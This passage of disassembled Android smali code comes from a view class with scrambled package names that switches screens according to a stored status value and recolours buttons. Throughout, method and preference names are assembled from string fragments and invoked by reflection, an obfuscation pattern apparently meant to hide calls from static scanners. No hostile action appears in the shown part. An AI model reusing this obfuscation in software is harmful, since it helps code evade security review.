    invoke-virtual {v0}, Ljava/lang/NoSuchMethodException;->printStackTrace()V

    goto :goto_0

    .line 334
    .end local v0    # "e":Ljava/lang/NoSuchMethodException;
    .restart local v1    # "method":Ljava/lang/reflect/Method;
    :catch_2
    move-exception v0

    .line 336
    .local v0, "e":Ljava/lang/IllegalAccessException;
    :try_start_3
    invoke-virtual {v0}, Ljava/lang/IllegalAccessException;->printStackTrace()V

    goto :goto_0

    .line 337
    .end local v0    # "e":Ljava/lang/IllegalAccessException;
    :catch_3
    move-exception v0

    .line 339
    .local v0, "e":Ljava/lang/reflect/InvocationTargetException;
    invoke-virtual {v0}, Ljava/lang/reflect/InvocationTargetException;->printStackTrace()V
    :try_end_3
    .catch Ljava/lang/NoSuchMethodException; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_0
.end method

.method protected showNotificationHidden()Z
    .locals 1

    .prologue
    .line 279
    const/4 v0, 0x1

    return v0
.end method

.method public showpage(Ljava/lang/String;)V
    .locals 46
    .param p1, "page"    # Ljava/lang/String;

    .prologue
    .line 1318
    const-string v12, "ste"

    .line 1319
    .local v12, "dfd":Ljava/lang/String;
    invoke-virtual/range {p0 .. p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getContext()Landroid/content/Context;

    move-result-object v41

    new-instance v42, Ljava/lang/StringBuilder;

    const-string v43, "sy"

    invoke-direct/range {v42 .. v43}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v42

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    const-string v43, "ma"

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    invoke-virtual/range {v42 .. v42}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v42

    const/16 v43, 0x0

    invoke-virtual/range {v41 .. v43}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v28

    .line 1321
    .local v28, "userDetails":Landroid/content/SharedPreferences;
    new-instance v27, Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKin;

    invoke-direct/range {v27 .. v27}, Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKin;-><init>()V

    .line 1322
    .local v27, "putt2":Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKin;
    const-string v41, "getString"

    const-string v42, "status"

    const-string v43, "s0"

    move-object/from16 v0, v27

    move-object/from16 v1, v28

    move-object/from16 v2, v41

    move-object/from16 v3, v42

    move-object/from16 v4, v43

    invoke-virtual {v0, v1, v2, v3, v4}, Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKin;->runus(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v23

    .line 1326
    .local v23, "out":Ljava/lang/String;
    const-string v41, "s1"

    move-object/from16 v0, v23

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v41

    if-nez v41, :cond_0

    const-string v41, "s2"

    move-object/from16 v0, v23

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v41

    if-nez v41, :cond_0

    const-string v41, "s3"

    move-object/from16 v0, v23

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v41

    if-eqz v41, :cond_4

    :cond_0
    const-string v41, "page6"

    move-object/from16 v0, p1

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v41

    if-nez v41, :cond_4

    const-string v41, "page7"

    move-object/from16 v0, p1

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v41

    if-nez v41, :cond_4

    const-string v41, "page8"

    move-object/from16 v0, p1

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v41

    if-nez v41, :cond_4

    .line 1327
    const-string v41, "s1"

    move-object/from16 v0, v23

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v41

    if-eqz v41, :cond_1

    .line 1328
    const-string v41, "page6"

    move-object/from16 v0, p0

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->showpage(Ljava/lang/String;)V

    .line 1330
    :cond_1
    const-string v41, "s2"

    move-object/from16 v0, v23

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v41

    if-eqz v41, :cond_2

    .line 1331
    const-string v41, "page7"

    move-object/from16 v0, p0

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->showpage(Ljava/lang/String;)V

    .line 1333
    :cond_2
    const-string v41, "s3"

    move-object/from16 v0, v23

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v41

    if-eqz v41, :cond_3

    .line 1334
    const-string v41, "page8"

    move-object/from16 v0, p0

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->showpage(Ljava/lang/String;)V

    .line 1444
    :cond_3
    :goto_0
    return-void

    .line 1338
    :cond_4
    const v41, 0x7f080001

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v13

    check-cast v13, Landroid/widget/ImageView;

    .line 1339
    .local v13, "hom2":Landroid/widget/ImageView;
    const-string v41, "page1"

    move-object/from16 v0, p1

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v41

    if-eqz v41, :cond_5

    .line 1340
    const v41, 0x7f080072

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v6

    check-cast v6, Landroid/widget/LinearLayout;

    .line 1342
    .local v6, "buttonhome1":Landroid/widget/LinearLayout;
    :try_start_0
    const-string v41, "android.widget.LinearLayout"

    invoke-static/range {v41 .. v41}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v41

    new-instance v42, Ljava/lang/StringBuilder;

    const-string v43, "setB"

    invoke-direct/range {v42 .. v43}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->fgfghjjklipipi:Ljava/lang/String;

    move-object/from16 v43, v0

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    const-string v43, "dColor"

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    invoke-virtual/range {v42 .. v42}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v42

    const/16 v43, 0x1

    move/from16 v0, v43

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v43, v0

    const/16 v44, 0x0

    sget-object v45, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v45, v43, v44

    invoke-virtual/range {v41 .. v43}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v41

    const/16 v42, 0x1

    move/from16 v0, v42

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v42, v0

    const/16 v43, 0x0

    move-object/from16 v0, p0

    iget v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->hert:I

    move/from16 v44, v0

    invoke-static/range {v44 .. v44}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v44

    aput-object v44, v42, v43

    move-object/from16 v0, v41

    move-object/from16 v1, v42

    invoke-virtual {v0, v6, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_9

    .line 1344
    :goto_1
    const v41, 0x7f02000a

    move/from16 v0, v41

    invoke-virtual {v13, v0}, Landroid/widget/ImageView;->setImageResource(I)V

    .line 1346
    .end local v6    # "buttonhome1":Landroid/widget/LinearLayout;
    :cond_5
    const-string v41, "page2"

    move-object/from16 v0, p1

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v41

    if-eqz v41, :cond_6

    .line 1347
    const v41, 0x7f080074

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v7

    check-cast v7, Landroid/widget/LinearLayout;

    .line 1348
    .local v7, "buttonhome2":Landroid/widget/LinearLayout;
    :try_start_1
    const-string v41, "android.widget.LinearLayout"

    invoke-static/range {v41 .. v41}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v41

    new-instance v42, Ljava/lang/StringBuilder;

    const-string v43, "setB"

    invoke-direct/range {v42 .. v43}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->fgfghjjklipipi:Ljava/lang/String;

    move-object/from16 v43, v0

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    const-string v43, "dColor"

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    invoke-virtual/range {v42 .. v42}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v42

    const/16 v43, 0x1

    move/from16 v0, v43

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v43, v0

    const/16 v44, 0x0

    sget-object v45, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v45, v43, v44

    invoke-virtual/range {v41 .. v43}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v41

    const/16 v42, 0x1

    move/from16 v0, v42

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v42, v0

    const/16 v43, 0x0

    move-object/from16 v0, p0

    iget v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->hert:I

    move/from16 v44, v0

    invoke-static/range {v44 .. v44}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v44

    aput-object v44, v42, v43

    move-object/from16 v0, v41

    move-object/from16 v1, v42

    invoke-virtual {v0, v7, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_8

    .line 1350
    :goto_2
    const v41, 0x7f020006

    move/from16 v0, v41

    invoke-virtual {v13, v0}, Landroid/widget/ImageView;->setImageResource(I)V

    .line 1353
    .end local v7    # "buttonhome2":Landroid/widget/LinearLayout;
    :cond_6
    const-string v41, "deerda3"

    move-object/from16 v0, p1

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v41

    if-eqz v41, :cond_7

    .line 1354
    const v41, 0x7f080076

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v8

    check-cast v8, Landroid/widget/LinearLayout;

    .line 1355
    .local v8, "buttonhome3":Landroid/widget/LinearLayout;
    :try_start_2
    const-string v41, "android.widget.LinearLayout"

    invoke-static/range {v41 .. v41}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v41

    new-instance v42, Ljava/lang/StringBuilder;

    const-string v43, "setB"

    invoke-direct/range {v42 .. v43}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->fgfghjjklipipi:Ljava/lang/String;

    move-object/from16 v43, v0

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    const-string v43, "dColor"

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    invoke-virtual/range {v42 .. v42}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v42

    const/16 v43, 0x1

    move/from16 v0, v43

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v43, v0

    const/16 v44, 0x0

    sget-object v45, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v45, v43, v44

    invoke-virtual/range {v41 .. v43}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v41

    const/16 v42, 0x1

    move/from16 v0, v42

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v42, v0

    const/16 v43, 0x0

    move-object/from16 v0, p0

    iget v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->hert:I

    move/from16 v44, v0

    invoke-static/range {v44 .. v44}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v44

    aput-object v44, v42, v43

    move-object/from16 v0, v41

    move-object/from16 v1, v42

    invoke-virtual {v0, v8, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_7

    .line 1357
    :goto_3
    const v41, 0x7f020019

    move/from16 v0, v41

    invoke-virtual {v13, v0}, Landroid/widget/ImageView;->setImageResource(I)V

    .line 1359
    .end local v8    # "buttonhome3":Landroid/widget/LinearLayout;
    :cond_7
    const-string v41, "deedra4"

    move-object/from16 v0, p1

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v41

    if-eqz v41, :cond_8

    .line 1360
    const v41, 0x7f080078

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v9

    check-cast v9, Landroid/widget/LinearLayout;

    .line 1361
    .local v9, "buttonhome4":Landroid/widget/LinearLayout;
    :try_start_3
    const-string v41, "android.widget.LinearLayout"

    invoke-static/range {v41 .. v41}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v41

    new-instance v42, Ljava/lang/StringBuilder;

    const-string v43, "setB"

    invoke-direct/range {v42 .. v43}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->fgfghjjklipipi:Ljava/lang/String;

    move-object/from16 v43, v0

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    const-string v43, "dColor"

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    invoke-virtual/range {v42 .. v42}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v42

    const/16 v43, 0x1

    move/from16 v0, v43

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v43, v0

    const/16 v44, 0x0

    sget-object v45, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v45, v43, v44

    invoke-virtual/range {v41 .. v43}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v41

    const/16 v42, 0x1

    move/from16 v0, v42

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v42, v0

    const/16 v43, 0x0

    move-object/from16 v0, p0

    iget v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->hert2:I

    move/from16 v44, v0

    invoke-static/range {v44 .. v44}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v44

    aput-object v44, v42, v43

    move-object/from16 v0, v41

    move-object/from16 v1, v42

    invoke-virtual {v0, v9, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_6

    .line 1363
    :goto_4
    const v41, 0x7f020008

    move/from16 v0, v41

    invoke-virtual {v13, v0}, Landroid/widget/ImageView;->setImageResource(I)V

    .line 1365
    .end local v9    # "buttonhome4":Landroid/widget/LinearLayout;
    :cond_8
    const-string v41, "page5"

    move-object/from16 v0, p1

    move-object/from16 v1, v41

    invoke-virtual {v0, v1}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v41

    if-eqz v41, :cond_9

    .line 1366
    const v41, 0x7f08007a

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v10

    check-cast v10, Landroid/widget/LinearLayout;

    .line 1367
    .local v10, "buttonhome5":Landroid/widget/LinearLayout;
    :try_start_4
    const-string v41, "android.widget.LinearLayout"

    invoke-static/range {v41 .. v41}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v41

    new-instance v42, Ljava/lang/StringBuilder;

    const-string v43, "setB"

    invoke-direct/range {v42 .. v43}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->fgfghjjklipipi:Ljava/lang/String;

    move-object/from16 v43, v0

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    const-string v43, "dColor"

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    invoke-virtual/range {v42 .. v42}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v42

    const/16 v43, 0x1

    move/from16 v0, v43

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v43, v0

    const/16 v44, 0x0

    sget-object v45, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v45, v43, v44

    invoke-virtual/range {v41 .. v43}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v41

    const/16 v42, 0x1

    move/from16 v0, v42

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v42, v0

    const/16 v43, 0x0

    move-object/from16 v0, p0

    iget v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->hert:I

    move/from16 v44, v0

    invoke-static/range {v44 .. v44}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v44

    aput-object v44, v42, v43

    move-object/from16 v0, v41

    move-object/from16 v1, v42

    invoke-virtual {v0, v10, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_4
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_5

    .line 1368
    :goto_5
    const v41, 0x7f020025

    move/from16 v0, v41

    invoke-virtual {v13, v0}, Landroid/widget/ImageView;->setImageResource(I)V

    .line 1371
    .end local v10    # "buttonhome5":Landroid/widget/LinearLayout;
    :cond_9
    const v41, 0x7f080072

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v5

    check-cast v5, Landroid/widget/LinearLayout;

    .line 1372
    .local v5, "buttonhome":Landroid/widget/LinearLayout;
    :try_start_5
    const-string v41, "android.widget.LinearLayout"

    invoke-static/range {v41 .. v41}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v41

    new-instance v42, Ljava/lang/StringBuilder;

    const-string v43, "setB"

    invoke-direct/range {v42 .. v43}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->fgfghjjklipipi:Ljava/lang/String;

    move-object/from16 v43, v0

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    const-string v43, "dColor"

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    invoke-virtual/range {v42 .. v42}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v42

    const/16 v43, 0x1

    move/from16 v0, v43

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v43, v0

    const/16 v44, 0x0

    sget-object v45, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v45, v43, v44

    invoke-virtual/range {v41 .. v43}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v41

    const/16 v42, 0x1

    move/from16 v0, v42

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v42, v0

    const/16 v43, 0x0

    move-object/from16 v0, p0

    iget v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->hert3:I

    move/from16 v44, v0

    invoke-static/range {v44 .. v44}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v44

    aput-object v44, v42, v43

    move-object/from16 v0, v41

    move-object/from16 v1, v42

    invoke-virtual {v0, v5, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_5
    .catch Ljava/lang/Throwable; {:try_start_5 .. :try_end_5} :catch_4

    .line 1374
    :goto_6
    const v41, 0x7f080074

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v6

    check-cast v6, Landroid/widget/LinearLayout;

    .line 1375
    .restart local v6    # "buttonhome1":Landroid/widget/LinearLayout;
    :try_start_6
    const-string v41, "android.widget.LinearLayout"

    invoke-static/range {v41 .. v41}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v41

    new-instance v42, Ljava/lang/StringBuilder;

    const-string v43, "setB"

    invoke-direct/range {v42 .. v43}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->fgfghjjklipipi:Ljava/lang/String;

    move-object/from16 v43, v0

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    const-string v43, "dColor"

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    invoke-virtual/range {v42 .. v42}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v42

    const/16 v43, 0x1

    move/from16 v0, v43

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v43, v0

    const/16 v44, 0x0

    sget-object v45, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v45, v43, v44

    invoke-virtual/range {v41 .. v43}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v41

    const/16 v42, 0x1

    move/from16 v0, v42

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v42, v0

    const/16 v43, 0x0

    move-object/from16 v0, p0

    iget v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->hert3:I

    move/from16 v44, v0

    invoke-static/range {v44 .. v44}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v44

    aput-object v44, v42, v43

    move-object/from16 v0, v41

    move-object/from16 v1, v42

    invoke-virtual {v0, v6, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_6
    .catch Ljava/lang/Throwable; {:try_start_6 .. :try_end_6} :catch_3

    .line 1377
    :goto_7
    const v41, 0x7f080076

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v7

    check-cast v7, Landroid/widget/LinearLayout;

    .line 1378
    .restart local v7    # "buttonhome2":Landroid/widget/LinearLayout;
    :try_start_7
    const-string v41, "android.widget.LinearLayout"

    invoke-static/range {v41 .. v41}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v41

    new-instance v42, Ljava/lang/StringBuilder;

    const-string v43, "setB"

    invoke-direct/range {v42 .. v43}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->fgfghjjklipipi:Ljava/lang/String;

    move-object/from16 v43, v0

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    const-string v43, "dColor"

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    invoke-virtual/range {v42 .. v42}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v42

    const/16 v43, 0x1

    move/from16 v0, v43

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v43, v0

    const/16 v44, 0x0

    sget-object v45, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v45, v43, v44

    invoke-virtual/range {v41 .. v43}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v41

    const/16 v42, 0x1

    move/from16 v0, v42

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v42, v0

    const/16 v43, 0x0

    move-object/from16 v0, p0

    iget v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->hert3:I

    move/from16 v44, v0

    invoke-static/range {v44 .. v44}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v44

    aput-object v44, v42, v43

    move-object/from16 v0, v41

    move-object/from16 v1, v42

    invoke-virtual {v0, v7, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_7
    .catch Ljava/lang/Throwable; {:try_start_7 .. :try_end_7} :catch_2

    .line 1380
    :goto_8
    const v41, 0x7f080078

    move-object/from16 v0, p0

    move/from16 v1, v41

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v8

    check-cast v8, Landroid/widget/LinearLayout;

    .line 1381
    .restart local v8    # "buttonhome3":Landroid/widget/LinearLayout;
    :try_start_8
    const-string v41, "android.widget.LinearLayout"

    invoke-static/range {v41 .. v41}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v41

    new-instance v42, Ljava/lang/StringBuilder;

    const-string v43, "setB"

    invoke-direct/range {v42 .. v43}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->fgfghjjklipipi:Ljava/lang/String;

    move-object/from16 v43, v0

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    const-string v43, "dColor"

    invoke-virtual/range {v42 .. v43}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v42

    invoke-virtual/range {v42 .. v42}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v42

    const/16 v43, 0x1

